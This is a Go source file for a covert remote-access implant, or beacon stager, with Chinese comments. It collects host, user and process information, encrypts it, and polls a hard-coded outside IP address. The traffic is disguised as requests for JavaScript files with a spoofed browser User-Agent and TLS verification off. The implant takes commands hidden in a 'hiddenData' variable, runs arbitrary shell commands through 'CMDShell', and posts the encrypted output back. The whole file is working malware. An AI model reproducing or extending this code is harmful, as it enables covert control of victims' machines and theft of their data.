package main

import (
	"GO_Stager/AES" // 假设你已经实现了AES加密解密
	"GO_Stager/Command"
	"GO_Stager/config"
	"GO_Stager/sysinfo"
	"GO_Stager/util"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"math/rand"
	"net/http"
	"regexp"
	"strings"
	"sync"
	"time"
)

type BeaconData struct {
	ID        string `json:"ID"`
	HostName  string `json:"HostName"`
	User      string `json:"User"`
	ProcName  string `json:"ProcName"`
	ProcID    int    `json:"ProcID"`
	Integrity string `json:"Integrity"`
	Arch      string `json:"Arch"`
	IPAddr    string `json:"IPAddr"`
	OS        string `json:"OS"`
}

type BeaconTask struct {
	Id      string `json:"id"`
	Command string `json:"command"`
	Args    string `json:"args"`
	File    string `json:"file"`
}

// BeaconTaskOut 结构体用于发送任务输出
type BeaconTaskOut struct {
	Id       string `json:"Id"`
	TaskName string `json:"TaskName"`
	TaskArgs string `json:"TaskArgs"`
	TaskOut  string `json:"TaskOut"`
}

// 命令处理
type Commands struct {
	Name    string
	Execute func(task BeaconTask) (string, error)
}

var commands = []Commands{
	{
		Name: "ls",
		Execute: func(task BeaconTask) (string, error) {
			// 这里可以实现具体的命令执行逻辑
			util.Println("ls had success!")
			// 模拟执行耗时
			time.Sleep(1 * time.Second)

			return util.Sprintf("Executed command: %s with args: %s", task.Command, task.Args), nil
		},
	},
	{
		Name: "ps",
		Execute: func(task BeaconTask) (string, error) {
			util.Println("ps had success!")
			return util.Sprintf("Executed command: %s with args: %s", task.Command, task.Args), nil
		},
	},
	{
		Name: "CMDShell",
		Execute: func(task BeaconTask) (string, error) {
			result, _ := Command.ShellExecute(task.Args)
			util.Println(result)
			return util.Sprintf("Result is %s", result), nil
		},
	},
}

type TaskQueue struct {
	tasks []BeaconTask
	mu    sync.Mutex
}

func (q *TaskQueue) Enqueue(task BeaconTask) {
	q.mu.Lock()
	defer q.mu.Unlock()
	q.tasks = append(q.tasks, task)
	util.Printf("Task enqueued: %+v\n", task)
}

func (q *TaskQueue) Dequeue() (BeaconTask, bool) {
	q.mu.Lock()
	defer q.mu.Unlock()
	if len(q.tasks) == 0 {
		return BeaconTask{}, false
	}
	task := q.tasks[0]
	q.tasks = q.tasks[1:]
	return task, true
}

type HTTPComms struct {
	ConnAddr   string
	ConnPort   int
	Schema     string
	client     *http.Client
	cancelCh   chan struct{}
	BeaconData *BeaconData
	TaskQueue  *TaskQueue
}

func NewHTTPComms(connAddr string, connPort int) *HTTPComms {
	util.Println("Initializing HTTPComms")
	return &HTTPComms{
		ConnAddr: connAddr,
		ConnPort: connPort,
		Schema:   "https",
		client:   &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}},
		cancelCh: make(chan struct{}),
		TaskQueue: &TaskQueue{
			tasks: make([]BeaconTask, 0),
		},
	}
}

func (hc *HTTPComms) GenerateRandomString(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = chars[rand.Intn(len(chars))]
	}
	return string(result)
}

func (hc *HTTPComms) BeaconInit(beaconData *BeaconData) {
	util.Println("Initializing beacon data")
	hc.BeaconData = beaconData
}

func GetBeaconData() *BeaconData {
	arch := sysinfo.GetArch()
	hostname := sysinfo.GetHostName()
	id := sysinfo.GetHeaconID()
	config.HeaconId = id
	ip := sysinfo.GetIPAddr()
	integrity := sysinfo.GetIntegrity()
	procid, procname := sysinfo.GetProcInfo()
	user := sysinfo.GetUser()
	return &BeaconData{
		ID:        id,
		HostName:  hostname,
		User:      user,
		ProcName:  procname,
		ProcID:    procid,
		Integrity: integrity,
		Arch:      arch,
		IPAddr:    ip,
		OS:        "Linux",
	}
}

func (hc *HTTPComms) PollBeacon() error {
	util.Println("Starting PollBeacon process")

	for {
		select {
		case <-hc.cancelCh:
			util.Println("Polling cancelled")
			return nil
		default:
			go func() {
				if err := hc.sendRequest(); err != nil {
					util.Println("Error polling beacon:", err)
				}
			}()

			// 延时5秒
			time.Sleep(5 * time.Second)
		}
	}
}

func (hc *HTTPComms) sendRequest() error {
	encData, err := json.Marshal(hc.BeaconData)
	if err != nil {
		util.Println("Error marshalling BeaconData:", err)
		return err
	}

	base64Data := base64.StdEncoding.EncodeToString(encData)
	encDataStr := AES.Encrypt(base64Data)
	if encDataStr == "" {
		return util.Errorf("encryption failed")
	}

	cookieString := util.Sprintf("BA_HECTORDD=%s;", encDataStr)
	randomString := hc.GenerateRandomString(rand.Intn(10) + 5)
	url := util.Sprintf("%s://%s:%d/static/js/app.%s.js", hc.Schema, hc.ConnAddr, hc.ConnPort, randomString)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		util.Println("Error creating HTTP request:", err)
		return err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0")
	req.Header.Set("Cookie", cookieString)

	resp, err := hc.client.Do(req)
	if err != nil {
		util.Println("Error making HTTP request:", err)
		return err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		util.Println("Error reading response body:", err)
		return err
	}

	re := regexp.MustCompile(`const hiddenData\s*=\s*([^;]+);`)
	matches := re.FindStringSubmatch(string(body))
	if len(matches) > 1 {
		encryptedData := matches[1]
		util.Println("Encrypted data found:", encryptedData)
		decryptedData, err := AES.Decrypt(encryptedData)
		if err != nil {
			util.Println("Error decrypting data:", err)
			return err
		}

		hc.HandleResp([]byte(decryptedData))
	} else {
		util.Println("No hidden data found in response")
	}

	return nil
}

func (hc *HTTPComms) HandleResp(resp []byte) {
	var tasks []BeaconTask
	if err := json.Unmarshal(resp, &tasks); err != nil {
		util.Println("Error unmarshalling response:", err)
		return
	}

	if len(tasks) > 0 {
		util.Printf("Number of tasks received: %d\n", len(tasks))
		for _, task := range tasks {
			taskJson, _ := json.MarshalIndent(task, "", "  ")
			util.Println("获取到的任务:", string(taskJson))

			// 将任务加入队列
			hc.TaskQueue.Enqueue(task)
		}
	} else {
		util.Println("没有获取到任何任务。")
	}
}

func (hc *HTTPComms) HandleTaskAsync(task BeaconTask) {
	// 解密任务字段
	task.Id, _ = AES.Decrypt(task.Id)
	task.Command, _ = AES.Decrypt(task.Command)
	task.Args, _ = AES.Decrypt(task.Args)
	task.File, _ = AES.Decrypt(task.File)
	// 查找命令
	var command *Commands
	for _, cmd := range commands {
		if strings.EqualFold(cmd.Name, task.Command) {
			command = &cmd
			break
		}
	}

	if command == nil {
		util.Printf("Command not found for task: %+v\n", task)
		return
	}

	// 执行命令并处理结果
	go func() {
		defer func() {
			if r := recover(); r != nil {
				SendTaskOutAsync(hc, task, task.Id, util.Sprintf("Error: %v", r))
			}
		}()

		_out, err := command.Execute(task)
		if err != nil {
			SendTaskOutAsync(hc, task, task.Id, err.Error())
		} else {
			SendTaskOutAsync(hc, task, task.Id, _out)
		}
	}()
}

func SendTaskOutAsync(hc *HTTPComms, task BeaconTask, id, output string) {
	go func() {
		println("taskout:", output)
		// 加密任务输出
		taskOut := BeaconTaskOut{
			Id:       id,
			TaskName: Encrypt(task.Command),
			TaskArgs: Encrypt(task.Args),
			TaskOut:  Encrypt(output),
		}

		// 发送数据
		if err := hc.DataSend(taskOut); err != nil {
			util.Printf("Error sending task output: %v\n", err)
		}
	}()
}

// Encrypt function (假设你有一个实现)
func Encrypt(data string) string {
	// 在这里实现你的加密逻辑
	return AES.Encrypt(data) // 调用 AES 加密方法
}

// DataSend sends the task output data to a remote server.
// DataSend sends the task output data to a remote server.
func (hc *HTTPComms) DataSend(taskOut BeaconTaskOut) error {
	encData1, err := json.Marshal(hc.BeaconData)
	if err != nil {
		util.Println("Error marshalling BeaconData:", err)
		return err
	}

	base64Data := base64.StdEncoding.EncodeToString(encData1)
	encDataStr := AES.Encrypt(base64Data)
	if encDataStr == "" {
		return util.Errorf("encryption failed")
	}

	cookieString := util.Sprintf("BA_HECTORDD=%s;", encDataStr)
	// 将整个 taskOut 序列化为 JSON
	jsonData, err := json.Marshal([]BeaconTaskOut{taskOut}) // 包装在切片中以匹配格式
	if err != nil {
		util.Println("Error marshalling taskOut:", err)
		return err
	}

	// 对 JSON 数据进行加密
	encryptedData := Encrypt(string(jsonData)) // 加密后将 JSON 转为字符串
	if encryptedData == "" {
		return util.Errorf("encryption failed")
	}

	// 创建请求的内容，使用 text/plain 类型
	httpContent := bytes.NewBufferString(encryptedData)

	// 生成随机字符串
	randomString := hc.GenerateRandomString(10) // 5 到 15 的随机数，使用 10 作为示例

	// 创建请求的路由
	requestPath := util.Sprintf("/static/js/app.%s.js", randomString)

	// 打印 Cookie 和请求体内容
	util.Println("Cookie:", cookieString)
	util.Println("请求体内容:", encryptedData)

	// 创建 POST 请求使用 hc.client
	req, err := http.NewRequest("POST", util.Sprintf("%s://%s:%d%s", hc.Schema, hc.ConnAddr, hc.ConnPort, requestPath), httpContent)
	if err != nil {
		return util.Errorf("error creating HTTP request: %w", err)
	}

	// 设置请求头
	req.Header.Set("Content-Type", "text/plain; charset=utf-8")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0")
	req.Header.Set("Cookie", cookieString)

	// 发送请求
	resp, err := hc.client.Do(req)
	if err != nil {
		return util.Errorf("error sending POST request: %w", err)
	}
	defer resp.Body.Close()

	// 读取响应
	if resp.StatusCode != http.StatusOK {
		return util.Errorf("received non-200 response: %s", resp.Status)
	}

	// 可以在这里处理响应（如果有必要）
	return nil
}

// GenerateRandomString generates a random string of a specified length.
func GenerateRandomString(minLength, maxLength int) string {
	length := rand.Intn(maxLength-minLength+1) + minLength
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = chars[rand.Intn(len(chars))]
	}
	return string(result)
}

func (hc *HTTPComms) ProcessTasks() {
	for {
		task, ok := hc.TaskQueue.Dequeue()
		if !ok {
			time.Sleep(1 * time.Second) // 短暂休眠以避免忙等待
			continue
		}
		util.Printf("Processing task: %+v\n", task)
		hc.HandleTaskAsync(task)
	}
}

func main() {
	util.Println("Starting main function")
	rand.Seed(time.Now().UnixNano())

	hc := NewHTTPComms("121.36.61.196", 5004)
	hc.BeaconInit(GetBeaconData())

	// 启动轮询和处理任务的goroutine
	go func() {
		if err := hc.PollBeacon(); err != nil {
			util.Println("Error polling beacon:", err)
		}
	}()

	go hc.ProcessTasks()

	// 阻止main退出，模拟持久运行的程序
	select {}
}
